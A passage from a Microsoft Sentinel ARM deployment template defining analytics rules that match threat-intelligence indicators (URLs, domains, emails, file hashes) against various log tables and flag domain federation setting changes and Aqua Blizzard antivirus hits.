          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c82d6a2f-e9dc-4bb3-992f-016830fdd067')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c82d6a2f-e9dc-4bb3-992f-016830fdd067')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map URL Entity to UrlClickEvents",
          "description": "This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in UrlClickEvents.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet UrlClickEvents_ = materialize(UrlClickEvents\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend UrlClickEvents_TimeGenerated = TimeGenerated);\nlet ChainReportID = UrlClickEvents_\n    | mv-expand todynamic(UrlChain)\n    | extend UrlChain = tolower(UrlChain)\n    | project ReportId, Url, UrlChain;\n// Url is not always in UrlChain, so we need to check both\nlet ClickedUrls = \n  (union isfuzzy=false (ChainReportID), (ChainReportID | project Url = UrlChain))\n  | distinct Url\n  | summarize make_list(Url);\nlet TI = materialize(ThreatIntelligenceIndicator\n  | where TimeGenerated >= ago(ioc_lookBack)\n  | where isnotempty(Url) and tolower(Url) in (ClickedUrls)\n  | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n  | where Active == true and ExpirationDateTime > now()\n  | project-rename TI_Url = Url, TI_Type = Type\n  );\n(union isfuzzy=false (TI | join kind=innerunique (ChainReportID) on $left.TI_Url == $right.UrlChain),\n  (TI | join kind=innerunique (ChainReportID) on $left.TI_Url == $right.Url))\n| project-away UrlChain\n| join kind=innerunique (UrlClickEvents_) on ReportId\n| where UrlClickEvents_TimeGenerated < ExpirationDateTime\n| summarize UrlClickEvents_TimeGenerated = arg_max(UrlClickEvents_TimeGenerated, *) by IndicatorId\n| project UrlClickEvents_TimeGenerated, AccountUpn, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, Url, NetworkMessageId\n| extend timestamp = UrlClickEvents_TimeGenerated\n| extend timestamp = UrlClickEvents_TimeGenerated, Name = tostring(split(AccountUpn, '@', 0)[0]), UPNSuffix = tostring(split(AccountUpn, '@', 1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "23391c84-87d8-452f-a84c-47a62f01e115",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountUpn"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/26ece0a9-e746-432c-8467-c198029aa372')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/26ece0a9-e746-432c-8467-c198029aa372')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map URL Entity to Syslog Data",
          "description": "This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in Syslog data.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nThreatIntelligenceIndicator\n// Picking up only IOC's that contain the entities we want\n| where isnotempty(Url)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n  Syslog\n  | where TimeGenerated >= ago(dt_lookBack)\n  // Extract URL from the Syslog message but only take messages that include URLs\n  | extend Url = extract(\"(http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\\\(\\\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+)\", 1,SyslogMessage)\n  | where isnotempty(Url)\n  | extend Syslog_TimeGenerated = TimeGenerated\n) on Url\n| where Syslog_TimeGenerated < ExpirationDateTime\n| summarize Syslog_TimeGenerated  = arg_max(Syslog_TimeGenerated , *) by IndicatorId, Url\n| project timestamp = Syslog_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, SyslogMessage, Computer, ProcessName, Url, HostIP\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b31037ea-6f68-4fbd-bab2-d0d0f44c2fcf",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "HostIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/907df5a4-badf-402e-8d32-2f466bbfb00b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/907df5a4-badf-402e-8d32-2f466bbfb00b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map URL Entity to PaloAlto Data",
          "description": "This query identifies any URL indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in PaloAlto Data.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nThreatIntelligenceIndicator\n// Picking up only IOC's that contain the entities we want\n| where isnotempty(Url)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n  CommonSecurityLog\n  | extend IngestionTime = ingestion_time()\n  | where IngestionTime > ago(dt_lookBack)\n  // Select on Palo Alto logs\n  | where DeviceVendor =~ \"Palo Alto Networks\"\n  | where DeviceEventClassID =~ 'url'\n  //Uncomment the line below to only alert on allowed connections\n  //| where DeviceAction !~ \"block-url\"\n  //Select logs where URL data is populated\n  | extend PA_Url = column_ifexists(\"RequestURL\", \"None\")\n  | extend PA_Url = iif(isempty(PA_Url), extract(\"([^\\\"]+)\", 1, tolower(AdditionalExtensions)), trim('\"', PA_Url))\n  | extend PA_Url = iif(PA_Url !startswith \"http://\" and ApplicationProtocol !~ \"ssl\", strcat('http://', PA_Url), iif(PA_Url !startswith \"https://\" and ApplicationProtocol =~ \"ssl\", strcat('https://', PA_Url), PA_Url))\n  | where isnotempty(PA_Url)\n  | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n) on $left.Url == $right.PA_Url\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime\n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId, PA_Url\n| project timestamp = CommonSecurityLog_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, ExpirationDateTime, ConfidenceScore, DeviceAction, SourceIP, PA_Url, DeviceName\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "106813db-679e-4382-a51b-1bfc463befc3",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "PA_Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/14ce77eb-2d94-4577-b020-5586826c60dd')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/14ce77eb-2d94-4577-b020-5586826c60dd')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map Email entity to PaloAlto CommonSecurityLog",
          "description": "Identifies a match in CommonSecurityLog table from any Email IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet emailregex = @'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+$';\nThreatIntelligenceIndicator\n//Filtering the table for Email related IOCs\n| where isnotempty(EmailSenderAddress)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n| join kind=innerunique (\n    CommonSecurityLog | where TimeGenerated >= ago(dt_lookBack) and isnotempty(DestinationUserID)\n    // Filtering PAN Logs for specific event type to match relevant email entities\n    | where DeviceVendor == \"Palo Alto Networks\" and  DeviceEventClassID == \"wildfire\" and ApplicationProtocol in (\"smtp\",\"pop3\")\n    | extend DestinationUserID = tolower(DestinationUserID)\n    | where DestinationUserID matches regex emailregex\n    | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n)\non $left.EmailSenderAddress == $right.DestinationUserID\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime\n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId, DestinationUserID\n| project CommonSecurityLog_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore, EmailSenderName, EmailRecipient,\nEmailSourceDomain, EmailSourceIpAddress, EmailSubject, FileHashValue, FileHashType, DestinationUserID, DeviceEventClassID, LogSeverity, DeviceAction, SourceIP, SourcePort,\nDestinationIP, DestinationPort, Protocol, ApplicationProtocol\n| extend timestamp = CommonSecurityLog_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1566"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "ffcd575b-3d54-482a-a6d8-d0de13b6ac63",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "DestinationUserID"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0bd97eba-d4f2-4baa-b7cf-e118897dd476')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0bd97eba-d4f2-4baa-b7cf-e118897dd476')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI Map Domain Entity to DeviceNetworkEvents",
          "description": "This query identifies any Domain indicators of compromise (IOCs) from threat intelligence (TI) by searching for matches in DeviceNetworkEvents.",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet DeviceNetworkEvents_ = DeviceNetworkEvents\n  | where isnotempty(RemoteUrl)\n  | where TimeGenerated >= ago(dt_lookBack)\n  | where ActionType !has \"ConnectionFailed\"\n  | extend Domain = tostring(parse_url(tolower(RemoteUrl)).Host)\n  | where isnotempty(Domain)\n  | project-rename DeviceNetworkEvents_TimeGenerated = TimeGenerated;\nlet DeviceNetworkEventDomains = DeviceNetworkEvents_\n  | distinct Domain\n  | summarize make_list(Domain);\nThreatIntelligenceIndicator\n| where isnotempty(DomainName)\n| where TimeGenerated >= ago(ioc_lookBack)\n| extend TI_Domain = tolower(DomainName)\n| where TI_Domain in (DeviceNetworkEventDomains)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n| join kind=innerunique (DeviceNetworkEvents_) on $left.TI_Domain == $right.Domain\n| where DeviceNetworkEvents_TimeGenerated < ExpirationDateTime\n| summarize DeviceNetworkEvents_TimeGenerated = arg_max(DeviceNetworkEvents_TimeGenerated, *) by IndicatorId, TI_Domain\n| project DeviceNetworkEvents_TimeGenerated, IndicatorId, TI_Domain, Url = RemoteUrl, ConfidenceScore, Description, ThreatType, Tags, TrafficLightProtocolLevel, ActionType, DeviceId, DeviceName, InitiatingProcessAccountUpn, InitiatingProcessCommandLine, RemoteIP, RemotePort\n| extend Name = tostring(split(InitiatingProcessAccountUpn, '@', 0)[0]), UPNSuffix = tostring(split(InitiatingProcessAccountUpn, '@', 1)[0])\n| extend timestamp = DeviceNetworkEvents_TimeGenerated, UserPrincipalName = InitiatingProcessAccountUpn\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c308b2f3-eebe-4a20-905c-cb8293b062db",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "InitiatingProcessCommandLine"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/55ea8445-4991-4f4e-9a03-06a595a5311f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/55ea8445-4991-4f4e-9a03-06a595a5311f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map File Hash to CommonSecurityLog Event",
          "description": "Identifies a match in CommonSecurityLog Event data from any FileHash IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet fileHashIndicators = ThreatIntelligenceIndicator\n| where isnotempty(FileHashValue)\n| where TimeGenerated >= ago(ioc_lookBack)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now();\n// Handle matches against both lower case and uppercase versions of the hash:\n(fileHashIndicators | extend  FileHashValue = tolower(FileHashValue)\n| union (fileHashIndicators | extend FileHashValue = toupper(FileHashValue)))\n// using innerunique to keep perf fast and result set low, we only need one match to indicate potential malicious activity that needs to be investigated\n|  join kind=innerunique (\n  CommonSecurityLog | where TimeGenerated >= ago(dt_lookBack)\n  | where isnotempty(FileHash)\n  | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n  )\non $left.FileHashValue == $right.FileHash\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime\n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId, FileHashValue\n| project CommonSecurityLog_TimeGenerated, Description, ActivityGroupNames, IndicatorId, ThreatType, Url, ExpirationDateTime, ConfidenceScore,\nSourceIP, SourcePort, DestinationIP, DestinationPort, SourceUserID, SourceUserName, DeviceName, DeviceAction,\nRequestURL, DestinationUserName, DestinationUserID, ApplicationProtocol, Activity, FileHashValue, FileHashType\n| extend HostName = tostring(split(DeviceName, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(DeviceName, '.'), 1, -1), '.'))\n| extend Name = tostring(split(SourceUserName, '@', 0)[0]), UPNSuffix = tostring(split(SourceUserName, '@', 1)[0])\n| extend timestamp = CommonSecurityLog_TimeGenerated\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "5d33fc63-b83b-4913-b95e-94d13f0d379f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "SourceUserName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Value",
                  "columnName": "FileHashValue"
                },
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashType"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.3.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8059cdbb-6f15-4644-bbf2-8f00b7bb4497')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8059cdbb-6f15-4644-bbf2-8f00b7bb4497')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "NRT",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "NRT Modified domain federation trust settings",
          "description": "This will alert when a user or application modifies the federation settings on the domain or Update domain authentication from Managed to Federated.\nFor example, this alert will trigger when a new Active Directory Federated Service (ADFS) TrustedRealm object, such as a signing certificate, is added to the domain.\nModification to domain federation settings should be rare. Confirm the added or modified target domain/URL is legitimate administrator behavior.\nTo understand why an authorized user may update settings for a federated domain in Office 365, Azure, or Intune, see: https://docs.microsoft.com/office365/troubleshoot/active-directory/update-federated-domain-office-365.\nFor details on security realms that accept security tokens, see the ADFS Proxy Protocol (MS-ADFSPP) specification: https://docs.microsoft.com/openspecs/windows_protocols/ms-adfspp/e7b9ea73-1980-4318-96a6-da559486664b.\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.",
          "severity": "High",
          "enabled": true,
          "query": "AuditLogs\n| where OperationName =~ \"Set federation settings on domain\" or OperationName =~ \"Set domain authentication\"\n//| where Result =~ \"success\"   // commenting out, as it may be interesting to capture failed attempts\n| mv-expand TargetResources\n| extend modifiedProperties = parse_json(TargetResources).modifiedProperties\n| mv-apply Property = modifiedProperties on \n  (\n      where Property.displayName =~ \"LiveType\"\n      | extend targetDisplayName = tostring(Property.displayName),\n               NewDomainValue = tostring(Property.newValue)\n  )\n| extend Federated = iif(OperationName =~ \"Set domain authentication\", iif(NewDomainValue has \"Federated\", True, False), True)\n| where Federated == True\n| mv-expand AdditionalDetails\n| mv-apply AdditionalDetail = AdditionalDetails on \n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend UserAgent = tostring(AdditionalDetail.value)\n  )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| project-reorder TimeGenerated, OperationName, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, AADOperationType, targetDisplayName, Result, UserAgent, CorrelationId, TenantId, AADTenantId\n| extend Name = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n",
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "tactics": [
            "CredentialAccess",
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1555",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "8540c842-5bbc-4a24-9fb2-a836c0e55a51",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/cd792273-b367-4f73-a5f5-57f7eccf0462')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/cd792273-b367-4f73-a5f5-57f7eccf0462')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Aqua Blizzard AV hits - Feb 2022",
          "description": "Identifies a match in the Security Alert table for MDATP hits related to the Aqua Blizzard actor",
          "severity": "High",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/ActiniumIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet AVHits = (iocs | where Type =~ \"AVDetection\"| project IoC);\nSecurityAlert\n| where ProviderName == 'MDATP'\n| extend ThreatName_ = tostring(parse_json(ExtendedProperties).ThreatName)\n| where ThreatName_ has_any (AVHits)\n| extend Directory = tostring(parse_json(Entities)[0].Directory), SHA256 = tostring(parse_json(tostring(parse_json(Entities)[0].FileHashes))[2].Value), FileName = tostring(parse_json(Entities)[0].Name), Hostname = tostring(parse_json(Entities)[6].FQDN)| extend AccountName = tostring(parse_json(tostring(parse_json(Entities)[6].LoggedOnUsers))[0].AccountName)\n| project TimeGenerated, AlertName, ThreatName_, ProviderName, AlertSeverity, Description, RemediationSteps, ExtendedProperties, Entities, FileName,SHA256, Directory, Hostname, AccountName\n| extend FileHash = SHA256, FileHashType = \"SHA256\"\n| extend Name = tostring(split(AccountName, \"@\")[0]), AccountUPNSuffix = tostring(split(AccountName, \"@\")[1])\n| extend Host = tostring(split(Hostname, \".\")[0]), DomainIndex = toint(indexof(Hostname, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Hostname, DomainIndex + 1), Hostname)\n",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT6H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1137"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "18dbdc22-b69f-4109-9e39-723d9465f45f",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
